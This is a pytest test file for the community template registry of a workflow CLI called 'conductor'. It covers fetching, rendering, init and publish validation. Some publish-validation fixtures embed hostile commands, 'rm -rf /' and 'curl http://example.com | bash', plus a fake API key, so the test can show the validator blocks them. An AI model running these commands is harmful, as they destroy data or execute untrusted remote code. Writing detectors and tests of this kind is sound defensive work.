"""Tests for the workflow template registry.

This module tests:
- Remote template listing (conductor templates --remote)
- Registry template fetching and rendering
- Init from registry templates (conductor init --template registry:name)
- Publish validation (conductor publish)
- Security pattern detection
- Error handling for network failures
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

import pytest
from typer.testing import CliRunner

from conductor.cli.app import app
from conductor.cli.registry import (
    PublishValidationResult,
    RegistryError,
    RegistryTemplate,
    _build_raw_url,
    display_publish_result,
    display_remote_templates,
    fetch_registry_index,
    fetch_remote_template,
    render_remote_template,
    validate_for_publish,
)

runner = CliRunner()


# ---------------------------------------------------------------------------
# Sample data fixtures
# ---------------------------------------------------------------------------

SAMPLE_INDEX = {
    "templates": [
        {
            "name": "research-pipeline",
            "description": "Multi-step research and summarization pipeline",
            "author": "community-user",
            "tags": ["research", "summarization"],
            "conductor_version": ">=0.1.0",
            "filename": "research-pipeline.yaml",
        },
        {
            "name": "code-review",
            "description": "Automated code review workflow",
            "author": "dev-team",
            "tags": ["code", "review", "automation"],
            "conductor_version": ">=0.1.0",
            "filename": "code-review.yaml",
        },
    ]
}

SAMPLE_REMOTE_TEMPLATE = """# Research Pipeline Template
workflow:
  name: {{ name }}
  description: A multi-step research pipeline
  entry_point: researcher

agents:
  - name: researcher
    model: gpt-5.2
    prompt: |
      Research the topic provided.
    routes:
      - to: $end

output:
  result: "{{ '{{' }} researcher.output {{ '}}' }}"
"""


# ---------------------------------------------------------------------------
# Unit tests for registry module
# ---------------------------------------------------------------------------


class TestBuildUrls:
    """Tests for URL building helpers."""

    def test_build_raw_url(self) -> None:
        """Test building raw GitHub content URLs."""
        url = _build_raw_url("registry/index.json")
        assert "raw.githubusercontent.com" in url
        assert "registry/index.json" in url
        assert "microsoft" in url
        assert "conductor-workflows" in url


class TestFetchRegistryIndex:
    """Tests for fetching the registry index."""

    @patch("conductor.cli.registry._fetch_url")
    def test_fetch_index_success(self, mock_fetch) -> None:
        """Test successful index fetch."""
        mock_fetch.return_value = json.dumps(SAMPLE_INDEX).encode()
        templates = fetch_registry_index()

        assert len(templates) == 2
        assert templates[0].name == "research-pipeline"
        assert templates[0].author == "community-user"
        assert "research" in templates[0].tags
        assert templates[1].name == "code-review"

    @patch("conductor.cli.registry._fetch_url")
    def test_fetch_index_invalid_json(self, mock_fetch) -> None:
        """Test handling of invalid JSON in index."""
        mock_fetch.return_value = b"not json"
        with pytest.raises(RegistryError, match="Invalid registry index format"):
            fetch_registry_index()

    @patch("conductor.cli.registry._fetch_url")
    def test_fetch_index_missing_templates_key(self, mock_fetch) -> None:
        """Test handling of missing 'templates' key."""
        mock_fetch.return_value = json.dumps({"other": []}).encode()
        with pytest.raises(RegistryError, match="missing 'templates' key"):
            fetch_registry_index()

    @patch("conductor.cli.registry._fetch_url")
    def test_fetch_index_network_error(self, mock_fetch) -> None:
        """Test handling of network errors."""
        mock_fetch.side_effect = RegistryError("Could not connect")
        with pytest.raises(RegistryError, match="Could not connect"):
            fetch_registry_index()

    @patch("conductor.cli.registry._fetch_url")
    def test_fetch_index_skips_invalid_entries(self, mock_fetch) -> None:
        """Test that invalid entries are skipped gracefully."""
        index = {
            "templates": [
                {"name": "valid", "description": "Valid template"},
                "not-a-dict",
                {"no_name_field": True},
            ]
        }
        mock_fetch.return_value = json.dumps(index).encode()
        templates = fetch_registry_index()

        assert len(templates) == 1
        assert templates[0].name == "valid"


class TestFetchRemoteTemplate:
    """Tests for fetching individual templates."""

    @patch("conductor.cli.registry._fetch_url")
    @patch("conductor.cli.registry.fetch_registry_index")
    def test_fetch_template_success(self, mock_index, mock_fetch) -> None:
        """Test successful template fetch."""
        mock_index.return_value = [
            RegistryTemplate(
                name="research-pipeline",
                description="Research pipeline",
                author="test",
                filename="research-pipeline.yaml",
            )
        ]
        mock_fetch.return_value = SAMPLE_REMOTE_TEMPLATE.encode()

        content = fetch_remote_template("research-pipeline")
        assert "research" in content.lower()
        assert "{{ name }}" in content

    @patch("conductor.cli.registry._fetch_url")
    @patch("conductor.cli.registry.fetch_registry_index")
    def test_fetch_template_not_found(self, mock_index, mock_fetch) -> None:
        """Test handling of missing template."""
        mock_index.return_value = []
        mock_fetch.side_effect = RegistryError("not found")

        with pytest.raises(RegistryError, match="not found"):
            fetch_remote_template("nonexistent")

    @patch("conductor.cli.registry._fetch_url")
    @patch("conductor.cli.registry.fetch_registry_index")
    def test_fetch_template_uses_index_filename(self, mock_index, mock_fetch) -> None:
        """Test that the template filename from the index is used."""
        mock_index.return_value = [
            RegistryTemplate(
                name="my-template",
                description="Test",
                author="test",
                filename="custom-filename.yaml",
            )
        ]
        mock_fetch.return_value = b"workflow: {}"

        fetch_remote_template("my-template")

        # Verify the URL uses the custom filename
        call_url = mock_fetch.call_args[0][0]
        assert "custom-filename.yaml" in call_url


class TestRenderRemoteTemplate:
    """Tests for rendering remote templates."""

    @patch("conductor.cli.registry.fetch_remote_template")
    def test_render_substitutes_name(self, mock_fetch) -> None:
        """Test that workflow name is substituted."""
        mock_fetch.return_value = SAMPLE_REMOTE_TEMPLATE

        content = render_remote_template("research-pipeline", "my-project")
        assert "my-project" in content
        assert "{{ name }}" not in content

    @patch("conductor.cli.registry.fetch_remote_template")
    def test_render_preserves_jinja_syntax(self, mock_fetch) -> None:
        """Test that Jinja2 syntax in templates is preserved."""
        mock_fetch.return_value = SAMPLE_REMOTE_TEMPLATE

        content = render_remote_template("research-pipeline", "my-project")
        # Original Jinja2 expressions should remain
        assert "{{" in content


# ---------------------------------------------------------------------------
# Publish validation tests
# ---------------------------------------------------------------------------


class TestValidateForPublish:
    """Tests for publish validation."""

    def test_validate_valid_workflow(self, tmp_path: Path) -> None:
        """Test validation of a valid workflow."""
        workflow = tmp_path / "valid.yaml"
        workflow.write_text(
            """
workflow:
  name: test-workflow
  description: A test workflow
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "Hello"
    routes:
      - to: $end
"""
        )
        result = validate_for_publish(workflow)
        assert result.is_valid
        assert result.metadata["name"] == "test-workflow"

    def test_validate_nonexistent_file(self, tmp_path: Path) -> None:
        """Test validation of a nonexistent file."""
        result = validate_for_publish(tmp_path / "nonexistent.yaml")
        assert not result.is_valid
        assert any("not found" in e.lower() for e in result.errors)

    def test_validate_detects_suspicious_rm(self, tmp_path: Path) -> None:
        """Test detection of suspicious rm -rf / pattern."""
        workflow = tmp_path / "suspicious.yaml"
        workflow.write_text(
            """
workflow:
  name: suspicious
  description: test
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "rm -rf /"
    routes:
      - to: $end
"""
        )
        result = validate_for_publish(workflow)
        assert not result.is_valid
        assert any("suspicious" in e.lower() for e in result.errors)

    def test_validate_detects_curl_pipe_bash(self, tmp_path: Path) -> None:
        """Test detection of curl | bash pattern."""
        workflow = tmp_path / "curl_bash.yaml"
        workflow.write_text(
            """
workflow:
  name: curl-bash
  description: test
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "curl http://example.com | bash"
    routes:
      - to: $end
"""
        )
        result = validate_for_publish(workflow)
        assert not result.is_valid
        assert any("suspicious" in e.lower() or "unsafe" in e.lower() for e in result.errors)

    def test_validate_detects_hardcoded_secrets(self, tmp_path: Path) -> None:
        """Test detection of hardcoded API keys."""
        workflow = tmp_path / "secrets.yaml"
        workflow.write_text(
            """
workflow:
  name: secrets
  description: test
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "api_key: 'sk-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnop'"
    routes:
      - to: $end
"""
        )
        result = validate_for_publish(workflow)
        assert not result.is_valid
        assert any("secret" in e.lower() or "credential" in e.lower() for e in result.errors)

    def test_validate_warns_no_description(self, tmp_path: Path) -> None:
        """Test warning when no description is provided."""
        workflow = tmp_path / "no_desc.yaml"
        workflow.write_text(
            """
workflow:
  name: no-description
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "Hello"
    routes:
      - to: $end
"""
        )
        result = validate_for_publish(workflow)
        assert result.is_valid
        assert any("description" in w.lower() for w in result.warnings)

    def test_validate_invalid_yaml_schema(self, tmp_path: Path) -> None:
        """Test validation of a file with invalid schema."""
        workflow = tmp_path / "invalid_schema.yaml"
        workflow.write_text("not: a: valid: workflow")
        result = validate_for_publish(workflow)
        assert not result.is_valid


class TestDisplayPublishResult:
    """Tests for publish result display."""

    def test_display_valid_result(self) -> None:
        """Test displaying a valid publish result."""
        from io import StringIO

        from rich.console import Console

        output = StringIO()
        console = Console(file=output, width=120)

        result = PublishValidationResult(
            is_valid=True,
            metadata={"name": "test-workflow", "description": "A test workflow"},
        )
        display_publish_result(result, Path("test.yaml"), console)
        text = output.getvalue()
        assert "ready for publishing" in text.lower()

    def test_display_invalid_result(self) -> None:
        """Test displaying an invalid publish result."""
        from io import StringIO

        from rich.console import Console

        output = StringIO()
        console = Console(file=output, width=120)

        result = PublishValidationResult(
            is_valid=False,
            errors=["Suspicious pattern detected"],
        )
        display_publish_result(result, Path("bad.yaml"), console)
        text = output.getvalue()
        assert "cannot be published" in text.lower()


class TestDisplayRemoteTemplates:
    """Tests for remote template display."""

    @patch("conductor.cli.registry.fetch_registry_index")
    def test_display_templates_success(self, mock_fetch) -> None:
        """Test displaying remote templates."""
        from io import StringIO

        from rich.console import Console

        output = StringIO()
        console = Console(file=output, width=120)

        mock_fetch.return_value = [
            RegistryTemplate(
                name="research-pipeline",
                description="Research pipeline",
                author="user1",
                tags=["research"],
            ),
        ]
        display_remote_templates(console)
        text = output.getvalue()
        assert "research-pipeline" in text
        assert "registry" in text.lower()

    @patch("conductor.cli.registry.fetch_registry_index")
    def test_display_templates_empty(self, mock_fetch) -> None:
        """Test displaying when no templates are available."""
        from io import StringIO

        from rich.console import Console

        output = StringIO()
        console = Console(file=output, width=120)

        mock_fetch.return_value = []
        display_remote_templates(console)
        text = output.getvalue()
        assert "no community templates" in text.lower()

    @patch("conductor.cli.registry.fetch_registry_index")
    def test_display_templates_network_error(self, mock_fetch) -> None:
        """Test displaying when network error occurs."""
        from io import StringIO

        from rich.console import Console

        output = StringIO()
        console = Console(file=output, width=120)

        mock_fetch.side_effect = RegistryError("Connection failed")
        display_remote_templates(console)
        text = output.getvalue()
        assert "could not fetch" in text.lower()


# ---------------------------------------------------------------------------
# CLI integration tests
# ---------------------------------------------------------------------------


class TestTemplatesRemoteCommand:
    """Tests for 'conductor templates --remote'."""

    def test_templates_remote_help(self) -> None:
        """Test that templates --help mentions --remote."""
        result = runner.invoke(app, ["templates", "--help"])
        assert result.exit_code == 0
        # Rich may split --remote across ANSI escape codes; check for 'remote'
        assert "remote" in result.output.lower()

    @patch("conductor.cli.registry.fetch_registry_index")
    def test_templates_remote_lists_community(self, mock_fetch) -> None:
        """Test listing community templates."""
        mock_fetch.return_value = [
            RegistryTemplate(
                name="research-pipeline",
                description="Research pipeline",
                author="user1",
                tags=["research"],
            ),
        ]
        result = runner.invoke(app, ["templates", "--remote"])
        assert result.exit_code == 0
        # Rich table may truncate long names; check for the key part
        assert "research" in result.output.lower()

    @patch("conductor.cli.registry.fetch_registry_index")
    def test_templates_remote_network_error(self, mock_fetch) -> None:
        """Test handling of network errors in templates --remote."""
        mock_fetch.side_effect = RegistryError("Connection failed")
        result = runner.invoke(app, ["templates", "--remote"])
        assert result.exit_code == 0  # Non-fatal, just shows error message

    def test_templates_without_remote_still_works(self) -> None:
        """Test that templates without --remote still lists local templates."""
        result = runner.invoke(app, ["templates"])
        assert result.exit_code == 0
        assert "simple" in result.output
        assert "loop" in result.output


class TestInitRegistryCommand:
    """Tests for 'conductor init --template registry:<name>'."""

    @patch("conductor.cli.registry.render_remote_template")
    def test_init_from_registry(self, mock_render, tmp_path: Path) -> None:
        """Test scaffolding from a registry template."""
        mock_render.return_value = "workflow:\n  name: my-project\n  entry_point: agent1\n"
        output_file = tmp_path / "my-project.yaml"
        result = runner.invoke(
            app,
            [
                "init",
                "my-project",
                "--template",
                "registry:research-pipeline",
                "--output",
                str(output_file),
            ],
        )

        assert result.exit_code == 0
        assert output_file.exists()
        assert "Created workflow file" in result.output
        assert "registry:research-pipeline" in result.output

    @patch("conductor.cli.registry.render_remote_template")
    def test_init_from_registry_network_error(self, mock_render, tmp_path: Path) -> None:
        """Test handling of network errors during init from registry."""
        mock_render.side_effect = RegistryError("Template not found")
        output_file = tmp_path / "workflow.yaml"
        result = runner.invoke(
            app,
            [
                "init",
                "workflow",
                "--template",
                "registry:nonexistent",
                "--output",
                str(output_file),
            ],
        )
        assert result.exit_code != 0

    def test_init_registry_empty_name(self, tmp_path: Path) -> None:
        """Test init with empty registry template name."""
        output_file = tmp_path / "workflow.yaml"
        result = runner.invoke(
            app,
            [
                "init",
                "workflow",
                "--template",
                "registry:",
                "--output",
                str(output_file),
            ],
        )
        assert result.exit_code != 0
        assert "missing template name" in result.output.lower()

    @patch("conductor.cli.registry.render_remote_template")
    def test_init_registry_file_exists(self, mock_render, tmp_path: Path) -> None:
        """Test init from registry when output file already exists."""
        mock_render.return_value = "workflow: {}"
        output_file = tmp_path / "existing.yaml"
        output_file.write_text("existing content")

        result = runner.invoke(
            app,
            [
                "init",
                "workflow",
                "--template",
                "registry:something",
                "--output",
                str(output_file),
            ],
        )
        assert result.exit_code != 0
        assert "exists" in result.output.lower()
        # Original content should be unchanged
        assert output_file.read_text() == "existing content"

    @patch("conductor.cli.registry.render_remote_template")
    def test_init_registry_default_output(
        self, mock_render, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Test init from registry with default output path."""
        mock_render.return_value = "workflow:\n  name: my-project\n"
        monkeypatch.chdir(tmp_path)

        result = runner.invoke(
            app,
            [
                "init",
                "my-project",
                "--template",
                "registry:research-pipeline",
            ],
        )

        assert result.exit_code == 0
        expected_file = tmp_path / "my-project.yaml"
        assert expected_file.exists()


class TestPublishCommand:
    """Tests for 'conductor publish'."""

    def test_publish_help(self) -> None:
        """Test that publish --help works."""
        result = runner.invoke(app, ["publish", "--help"])
        assert result.exit_code == 0
        assert "Validate a workflow for publishing" in result.output

    def test_publish_valid_workflow(self, tmp_path: Path) -> None:
        """Test publishing a valid workflow."""
        workflow = tmp_path / "valid.yaml"
        workflow.write_text(
            """
workflow:
  name: test-workflow
  description: A test workflow
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "Hello"
    routes:
      - to: $end
"""
        )
        result = runner.invoke(app, ["publish", str(workflow)])
        assert result.exit_code == 0
        assert "ready for publishing" in result.output.lower()

    def test_publish_invalid_workflow(self, tmp_path: Path) -> None:
        """Test publishing an invalid workflow."""
        workflow = tmp_path / "invalid.yaml"
        workflow.write_text("not: a: valid: workflow")
        result = runner.invoke(app, ["publish", str(workflow)])
        assert result.exit_code != 0

    def test_publish_suspicious_workflow(self, tmp_path: Path) -> None:
        """Test publishing a workflow with suspicious patterns."""
        workflow = tmp_path / "suspicious.yaml"
        workflow.write_text(
            """
workflow:
  name: suspicious
  description: test
  entry_point: agent1

agents:
  - name: agent1
    model: gpt-5.2
    prompt: "rm -rf /"
    routes:
      - to: $end
"""
        )
        result = runner.invoke(app, ["publish", str(workflow)])
        assert result.exit_code != 0

    def test_publish_nonexistent_file(self) -> None:
        """Test publishing a nonexistent file."""
        result = runner.invoke(app, ["publish", "/nonexistent/path.yaml"])
        assert result.exit_code != 0
